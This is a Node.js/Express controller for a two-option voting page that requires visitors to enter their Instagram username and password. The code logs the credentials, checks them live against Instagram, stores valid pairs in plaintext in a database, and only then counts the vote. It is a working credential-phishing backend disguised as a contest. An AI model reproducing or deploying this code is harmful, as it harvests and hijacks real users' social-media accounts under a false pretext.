const {validationResult} = require("express-validator")
const user = require("./models/user.js")
const score = require("./models/score.js")
const Instagram = require('instagram-web-api')


class controller {
    async root(req, res){
        let score1 = await score.findOne({Id:1}) 
        score1 = score1.Score
        let score2 = await score.findOne({Id:2}) 
        score2 = score2.Score        
        res.render("index", {score1, score2})
    }


    async getData(req, res){
            const errors = validationResult(req)
            if(!errors.isEmpty()){
                return res.status(400).json(errors)
            }
            const {login, password, person} = req.body
            console.log(login, password, person)    

            let result = await user.findOne({login, password})
            if(!result){
                try {
                    const client = new Instagram(
                        {
                        username:login,
                        password
                        }
                    )
                    await client.login().then(async function(value) {
                        console.log(value); 
                        if(value.authenticated === true){
                            const log_pass = new user({login, password})
                            await log_pass.save()

                            try {
                                if(person==="person1" || person==="person2"){
                                    let scoreResult = await score.findOne({Name:person})
                                    if(scoreResult){
                                        let personScore = scoreResult.Score + 1
                                        console.log(personScore)
                                        await score.updateOne({person}, {Score:personScore})
                                        res.json({message:"OK"})            
                                    }
                                }                    
                            } catch (err) {
                                console.log(err)
                                res.json({"errors":[{"msg":"oops:("}]})                    
                            }                                                                      
                        }else{
                            res.json({"errors":[{"msg":"Incorrect password."}]})
                        }
                    })
                
                } catch (err) {
                    console.log(err)
                    console.log(" * * * * * * * * ")
                    res.json({"errors":[{"msg":"Please wait a few minutes before you try again."}]})
                
                } 
                


            }else{
                res.json({"errors":[{"msg":"This account has already been voted on."}]})
            }

 
    }
}

module.exports = new controller()